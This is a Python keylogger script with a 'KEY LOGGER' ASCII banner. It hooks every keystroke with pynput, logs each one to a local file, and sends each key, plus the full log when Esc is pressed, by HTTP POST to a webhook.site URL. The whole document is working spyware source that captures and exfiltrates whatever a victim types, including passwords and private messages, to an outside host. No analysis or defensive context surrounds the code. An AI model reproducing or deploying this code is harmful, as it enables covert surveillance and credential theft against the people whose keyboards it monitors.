#!/usr/bin/python3


import httpx
from pynput.keyboard import Key, Listener
import logging

url = "https://webhook.site/2a271a43-f443-47b4-b9ed-27a9eded4ba3"
banner = """


██╗░░██╗███████╗██╗░░░██╗  ██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██║░██╔╝██╔════╝╚██╗░██╔╝  ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
█████═╝░█████╗░░░╚████╔╝░  ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██╔═██╗░██╔══╝░░░░╚██╔╝░░  ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║░╚██╗███████╗░░░██║░░░  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝

"""
print(banner)

# logging directory is a current directory of the script
logdir = ""
# logging configuration
logging.basicConfig(filename=(logdir + "keylogger.log"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

f = open(logdir + "keylogger.log", "r")


def pressing(key):
    # send post request to webhook after each key press
    httpx.post(url, data={"key": str(key)})
    logging.info(str(key))
    if key == Key.esc:
        # send post request to webhook after esc key press
        httpx.post(url, data={"key": f.read()})
        f.close()
        return False


# listen for key press
with Listener(on_press=pressing) as listener:
    listener.join()


#ey.net
